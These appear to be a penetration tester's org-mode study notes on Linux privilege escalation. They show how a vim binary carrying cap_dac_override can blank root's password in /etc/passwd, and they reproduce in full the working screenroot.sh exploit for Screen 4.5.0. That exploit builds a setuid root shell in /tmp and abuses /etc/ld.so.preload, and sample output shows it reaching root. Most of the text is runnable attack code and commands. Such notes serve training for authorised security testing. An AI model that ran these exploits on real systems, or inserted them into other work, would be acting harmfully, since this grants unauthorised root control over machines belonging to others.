readme.org
**** Exploitation
If we gained access to the system with a low-privilege account, then discovered the ~dac_cap_override~ capability:
#+BEGIN_SRC bash
  getcap /usr/bin/vim.basic

  /usr/bin/vim.basic cap_dac_override=eip
#+END_SRC
For example, the ~/usr/bin/vim.basic~ binary is run without special privileges, such as with ~sudo~. However, because the binary has the ~cap_dac_override~ capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the ~cap_dac_override~ capability and perform tasks that require this capability.

Let us take a look at the ~/etc/passwd~ file where the user ~root~ is specified:
#+BEGIN_SRC bash
  cat /etc/passwd | head -n1

  root:x:0:0:root:/root:/bin/bash
#+END_SRC

We can use the ~cap_dac_override~ capability of the ~/usr/bin/vim~ binary to modify a system file:
#+BEGIN_SRC bash
  /usr/bin/vim.basic /etc/passwd
#+END_SRC

We also can make these changes in a non-interactive mode:
#+BEGIN_SRC bash
  echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
  Matthheeww@htb[/htb]$ cat /etc/passwd | head -n1
  
  root::0:0:root:/root:/bin/bash
#+END_SRC

Now, we can see that the ~x~ in that line is gone, which means that we can use the command ~su~ to log in as root without being asked for the password.
* Service-based Privilege Escalation
** Vulnerable Services
Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer [[https://linux.die.net/man/1/screen][Screen]]. Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.
*Screen Version Identification*
#+BEGIN_SRC bash
  screen -v

  Screen version 4.05.00 (GNU) 10-Dec-16  
#+END_SRC

This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.

*Privilege Escalation - Screen_Exploit.sh*
#+BEGIN_SRC bash
    ./screen_exploit.sh 

    ~ gnu/screenroot ~
    [+] First, we create our shell and library...
    [+] Now we create our /etc/ld.so.preload file...
    [+] Triggering...
    ' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
    [+] done!
    No Sockets found in /run/screen/S-mrb3n.

    # id
    uid=0(root) gid=0(root)
    groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
#+END_SRC
The below script can be used to perform this privilege escalation attack:
#+BEGIN_SRC bash
  #!/bin/bash
  # screenroot.sh
  # setuid screen v4.5.0 local root exploit
  # abuses ld.so.preload overwriting to get root.
  # bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
  # HACK THE PLANET
  # ~ infodox (25/1/2017)
  echo "~ gnu/screenroot ~"
  echo "[+] First, we create our shell and library..."
  cat << EOF > /tmp/libhax.c
  #include <stdio.h>
  #include <sys/types.h>
  #include <unistd.h>
  #include <sys/stat.h>
  __attribute__ ((__constructor__))
  void dropshell(void){
      chown("/tmp/rootshell", 0, 0);
      chmod("/tmp/rootshell", 04755);
      unlink("/etc/ld.so.preload");
      printf("[+] done!\n");
  }
  EOF
  gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
  rm -f /tmp/libhax.c
  cat << EOF > /tmp/rootshell.c
  #include <stdio.h>
  int main(void){
      setuid(0);
      setgid(0);
      seteuid(0);
      setegid(0);
      execvp("/bin/sh", NULL, NULL);
  }
  EOF
  gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
  rm -f /tmp/rootshell.c
  echo "[+] Now we create our /etc/ld.so.preload file..."
  cd /etc
  umask 000 # because
  screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
  echo "[+] Triggering..."
  screen -ls # screen itself is setuid, so...
  /tmp/rootshell
#+END_SRC
